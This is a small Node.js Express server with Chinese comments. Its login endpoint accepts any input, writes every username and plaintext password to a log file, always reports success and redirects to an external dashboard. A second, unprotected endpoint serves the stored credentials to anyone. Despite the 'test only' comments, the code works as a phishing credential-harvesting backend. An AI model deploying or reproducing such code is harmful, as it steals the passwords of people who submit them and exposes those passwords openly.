const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// 中间件
app.use(bodyParser.json());

// 登录API（不验证，直接记录所有输入）
app.post('/api/login', (req, res) => {
  try {
    const { username, password } = req.body;
    
    // 记录到文件（测试环境使用）
    const logEntry = `[${new Date().toISOString()}] 用户名: ${username}, 密码: ${password}\n`;
    
    fs.appendFile(
      path.join(__dirname, 'login_logs.txt'), 
      logEntry, 
      (err) => {
        if (err) console.error('记录失败:', err);
      }
    );
    
    // 无论输入什么都返回成功
    res.status(200).json({
      success: true,
      redirectUrl: 'http://example.com/dashboard'
    });
    
  } catch (error) {
    res.status(500).json({ error: '服务器内部错误' });
  }
});

// 查看日志（仅用于测试）
app.get('/api/logs', (req, res) => {
  fs.readFile(
    path.join(__dirname, 'login_logs.txt'), 
    'utf8', 
    (err, data) => {
      if (err) return res.status(500).json({ error: '读取日志失败' });
      res.send(data);
    }
  );
});

// 启动服务器
app.listen(PORT, () => {
  console.log(`服务器运行在端口 ${PORT}`);
});
